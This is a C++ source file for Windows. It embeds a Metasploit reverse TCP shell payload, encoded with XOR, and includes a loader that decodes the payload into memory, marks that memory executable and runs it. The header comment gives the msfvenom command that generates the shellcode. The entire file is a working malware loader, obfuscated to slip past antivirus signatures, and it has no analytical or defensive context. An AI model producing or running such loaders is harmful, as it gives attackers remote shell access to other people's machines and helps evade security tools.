
/* Shellcode : msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip in listen> LPORT=443 -f c -b \x00\x0a\x0d 
*/

#include <iostream>
#include <windows.h>

int main()
{
    unsigned char code[] = "\xbc\x8\xc3\xa4\xb0\xa8\x8c\x40\x40\x40\x1\x11\x1\x10\x12\x8\x71\x92\x11\x25\x8\xcb\x12\x20\x16\x8\xcb\x12\x58\x8\xcb\x12\x60\x8\xcb\x32\x10\xd\x71\x89\x8\x4f\xf7\xa\xa\x8\x71\x80\xec\x7c\x21\x3c\x42\x6c\x60\x1\x81\x89\x4d\x1\x41\x81\xa2\xad\x12\x1\x11\x8\xcb\x12\x60\xcb\x2\x7c\x8\x41\x90\x26\xc1\x38\x58\x4b\x42\x4f\xc5\x32\x40\x40\x40\xcb\xc0\xc8\x40\x40\x40\x8\xc5\x80\x34\x27\x8\x41\x90\x10\x4\xcb\x0\x60\x9\x41\x90\xcb\x8\x58\xa3\x16\xd\x71\x89\x8\xbf\x89\x1\xcb\x74\xc8\x8\x41\x96\x8\x71\x80\xec\x1\x81\x89\x4d\x1\x41\x81\x78\xa0\x35\xb1\xc\x43\xc\x64\x48\x5\x79\x91\x35\x98\x18\x4\xcb\x0\x64\x9\x41\x90\x26\x1\xcb\x4c\x8\x4\xcb\x0\x5c\x9\x41\x90\x1\xcb\x44\xc8\x1\x18\x1\x18\x1e\x19\x8\x41\x90\x1a\x1\x18\x1\x19\x1\x1a\x8\xc3\xac\x60\x1\x12\xbf\xa0\x18\x1\x19\x1a\x8\xcb\x52\xa9\xb\xbf\xbf\xbf\x1d\x8\x71\x9b\x13\x9\xfe\x37\x29\x2e\x28\x34\x34\x30\x40\x1\x16\x8\xc9\xa1\x9\x87\x82\xc\x37\x66\x47\xbf\x95\x13\x13\x8\xc9\xa1\x13\x1a\xd\x71\x80\xd\x71\x89\x13\x13\x9\xfa\x44\x5f\xdd\xfb\x40\x40\x40\x40\xbf\x95\x9\xc9\x84\xa8\x5c\x40\x40\x40\x71\x40\x77\x40\x72\x40\x6e\x40\x72\x40\x71\x40\x6e\x40\x76\x40\x78\x40\x6e\x40\x71\x40\x78\x40\x79\x40\x40\x40\x1a\x8\xc9\x81\x9\x87\x80\xfb\x41\x40\x40\xd\x71\x89\x9\xfa\x6\xdb\x5e\x82\x40\x40\x40\x40\xbf\x95\xa8\x2e\x40\x40\x40\x28\x40\x34\x40\x34\x40\x30\x40\x33\x40\x7a\x40\x6f\x40\x6f\x40\x71\x40\x77\x40\x72\x40\x6e\x40\x72\x40\x71\x40\x6e\x40\x76\x40\x78\x40\x6e\x40\x71\x40\x78\x40\x79\x40\x6f\x40\x16\x40\x37\x40\x35\x40\x2\x40\x30\x40\x22\x40\x77\x40\x2e\x40\x11\x40\x2c\x40\x19\x40\x2\x40\x29\x40\x1\x40\x3\x40\xb\x40\x19\x40\x17\x40\x10\x40\x77\x40\x7\x40\x1\x40\x25\x40\x6d\x40\x12\x40\x5\x40\x4\x40\x36\x40\x9\x40\x2f\x40\x4\x40\x73\x40\x40\x40\x8\xc9\x81\x13\x1a\x1\x18\xd\xc9\x85\x9\xc3\x80\x6a\xd\x71\x89\x13\x8\x87\x80\x40\x41\xc0\x40\x10\x13\x13\x9\x87\x82\xd8\x50\xf3\x1b\xbf\x95\x8\xc9\x86\x8\xc3\xa8\x60\x8\xc9\xa7\x8\xc9\xb9\x9\x87\x82\x61\xe7\x4b\x20\xbf\x95\xc5\x80\x4f\xc4\x2d\x40\x40\x40\x8\xcb\x7\x48\xc5\x80\x34\x7a\x8\xc9\x99\x8\xbf\x81\x8\x81\xa1\x60\x11\x13\x10\x8\xf8\x43\x40\x40\x40\x43\x40\x40\x40\x10\x9\xc9\xa0\x8\xc3\xac\x60\x8\xc9\xa7\x9\xc9\xb9\xc\xc9\xa1\xc\xc9\xaa\x9\x87\x82\x9a\x9d\xaa\x9\xbf\x95\xc5\x80\x34\x6d\xab\x52\x8\xcb\x7\x50\xc5\x80\x34\x63\x8\xc3\x87\x48\x2a\x43\x18\x8\xc9\x47\x9\xc9\xb8\x2a\x58\x1\x19\x8\xc9\xb1\x2a\x66\x1a\x9\xfa\x93\x18\xdd\x8e\x40\x40\x40\x40\xbf\x95\x2a\x4a\x1f\x8\xc9\xb1\x2a\x5f\x1a\x12\x28\x40\x73\x40\x40\x9\xc9\xa0\x2a\x44\x1\x19\x9\xfa\x93\x18\xdd\x8e\x40\x40\x40\x40\xbf\x95\xd\x71\x80\x13\x1a\x8\xc9\xb1\xd\x71\x89\x13\x13\x13\x13\x9\xfa\xd5\x18\xfb\xd1\x40\x40\x40\x40\xbf\x95\xc5\x80\x35\x4c\x8\xbf\x8f\x34\x42\xab\xfb\xa8\x28\x40\x40\x40\x8\xc9\xb1\x13\x1a\x9\x87\x82\x45\xc8\xdd\x30\xbf\x95\xc5\x80\x34\xa9\x13\x19\x2a\x0\x1a\x9\xc9\x91\x81\xa2\x50\x9\x87\x80\x40\x50\x40\x40\x9\xfa\x18\xe4\x13\xa5\x40\x40\x40\x40\xbf\x95\x8\xd3\x13\x13\x8\xc9\xa7\x8\xc9\xb1\x8\xc9\x9a\x9\x87\x80\x40\x60\x40\x40\x9\xc9\xb9\x9\x87\x82\x2c\x69\x64\x3e\xbf\x95\x8\xc3\x84\x60\xc5\x80\x4f\xc4\xdf\xbf\xbf\xbf\x26\xcb\x47\x8\x41\x83\xc5\x80\x35\x91\x18\x83\x18\x2a\x40\x19\x9\x87\x82\xb0\xf5\xe2\x16\xbf\x95";

    char* exec = (char*)VirtualAlloc(NULL, sizeof code, (MEM_RESERVE | MEM_COMMIT),PAGE_READWRITE);
    
    fprintf(stderr, "Allocated at :  %p \n", exec);
    
    DWORD oldPerm;

    if (exec != NULL) {
        int n = 0;

        for (int i = 0; i <= sizeof(code); i++) {
            char decOp = code[i] ^ 0x40;
          
            if (WriteProcessMemory(GetCurrentProcess(), exec +n, &decOp , 1, NULL)) {
                n++;
            }
            else {
                fprintf(stderr, "Error WriteProcessMemory ! \n");
                exit(-1);
            }
        }

        fprintf(stderr, " Executing ... \n");
        system("pause");
        VirtualProtect(exec, sizeof(exec), PAGE_EXECUTE_READWRITE, &oldPerm);

        ((void(*)())exec) ();
    
    }

    return 0;
}